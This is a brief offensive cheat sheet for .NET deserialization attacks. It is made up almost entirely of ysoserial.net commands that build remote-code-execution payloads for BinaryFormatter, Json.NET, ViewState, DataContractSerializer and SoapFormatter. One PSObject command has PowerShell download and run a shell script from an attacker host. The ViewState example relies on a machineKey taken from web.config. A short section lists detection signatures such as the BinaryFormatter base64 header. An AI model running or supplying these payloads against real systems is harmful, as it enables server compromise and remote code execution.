# .NET Deserialization

## 1. BinaryFormatter
```bash
# ysoserial.net
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c id"
ysoserial.exe -g PSObject -f BinaryFormatter -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
```

## 2. JSON.NET
```bash
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c whoami"
```

## 3. ViewState Deserialization
```bash
# Extract ViewState
# Find machineKey in web.config
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c id" --validationkey="..." --validationalgorithm="SHA1"
```

## 4. DataContractSerializer
```bash
ysoserial.exe -g ObjectDataProvider -f DataContractSerializer -c "cmd /c whoami"
```

## 5. SoapFormatter
```bash
ysoserial.exe -g ObjectDataProvider -f SoapFormatter -c "cmd /c whoami"
```

## 6. ObjectDataProvider Gadget
```bash
# Works with many formatters
ysoserial.exe -g ObjectDataProvider -f <formatter> -c "command"
```

## 7. WindowsIdentity Gadget
```bash
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"
```

## 8. TypeConfuseDelegate Gadget
```bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c id"
```

## 9. PSObject Gadget
```bash
ysoserial.exe -g PSObject -f BinaryFormatter -c "powershell -c whoami"
```

## Detection
```bash
# Look for AAEAAAD (base64 of BinaryFormatter header)
# Look for Content-Type: application/x-ms-ViewState
# Look for __VIEWSTATE in POST body
```

## Tools
```bash
# ysoserial.net
# https://github.com/pwntester/ysoserial.net
# ViewState decoder
# viewstate decoder Burp extension
```
